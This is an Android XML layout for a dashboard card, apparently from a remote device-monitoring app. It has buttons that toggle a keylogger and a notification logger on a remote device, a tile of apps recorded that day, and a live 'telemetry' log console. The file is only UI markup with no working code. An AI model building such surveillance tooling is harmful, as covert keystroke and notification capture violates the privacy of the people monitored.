<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical"
    android:background="@drawable/card_background"
    android:padding="16dp"
    android:layout_marginBottom="16dp">

    <!-- Device Header -->
    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:gravity="center_vertical"
        android:layout_marginBottom="12dp">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="📱"
            android:textSize="20sp"
            android:layout_marginRight="10dp" />

        <LinearLayout
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:orientation="vertical">

            <TextView
                android:id="@+id/txtDeviceName"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Device Identifier"
                android:textSize="16sp"
                android:textStyle="bold"
                android:textColor="#F1F5F9"
                android:fontFamily="monospace" />

            <TextView
                android:id="@+id/txtDeviceSub"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="Active Node // Full Telemetry"
                android:textSize="11sp"
                android:textColor="#94A3B8" />
        </LinearLayout>

        <TextView
            android:id="@+id/txtPresencePill"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="ONLINE"
            android:textSize="10sp"
            android:textStyle="bold"
            android:textColor="#22C55E"
            android:background="@drawable/online_pill_background"
            android:paddingLeft="8dp"
            android:paddingRight="8dp"
            android:paddingTop="4dp"
            android:paddingBottom="4dp" />
    </LinearLayout>

    <!-- Remote-Control Buttons -->
    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:layout_marginBottom="12dp">

        <Button
            android:id="@+id/btnToggleKeyLog"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Key Logger: ON"
            android:textSize="11sp"
            android:textStyle="bold"
            android:background="@drawable/btn_green_rounded"
            android:textColor="#FFFFFF"
            android:layout_marginRight="6dp" />

        <Button
            android:id="@+id/btnToggleNotifLog"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Notif Logger: ON"
            android:textSize="11sp"
            android:textStyle="bold"
            android:background="@drawable/btn_green_rounded"
            android:textColor="#FFFFFF"
            android:layout_marginLeft="6dp" />
    </LinearLayout>

    <!-- Per-Device Apps Recorded Today Tile -->
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Apps Recorded Today (This Device):"
        android:textStyle="bold"
        android:textSize="11sp"
        android:textColor="#94A3B8"
        android:fontFamily="monospace"
        android:layout_marginBottom="4dp" />

    <LinearLayout
        android:id="@+id/containerDeviceAppsToday"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:layout_marginBottom="12dp" />

    <!-- Terminal-style Log Panel (Optimized & Larger Size) -->
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="FULL RECORDED TELEMETRY FEED:"
        android:textStyle="bold"
        android:textSize="11sp"
        android:textColor="#94A3B8"
        android:fontFamily="monospace"
        android:layout_marginBottom="6dp" />

    <ScrollView
        android:id="@+id/logScrollView"
        android:layout_width="match_parent"
        android:layout_height="260dp"
        android:background="#0A0F1D"
        android:padding="10dp"
        android:fillViewport="false">

        <TextView
            android:id="@+id/txtDeviceLogConsole"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="Waiting for device activity..."
            android:textSize="11sp"
            android:textColor="#38BDF8"
            android:fontFamily="monospace" />
    </ScrollView>

</LinearLayout>
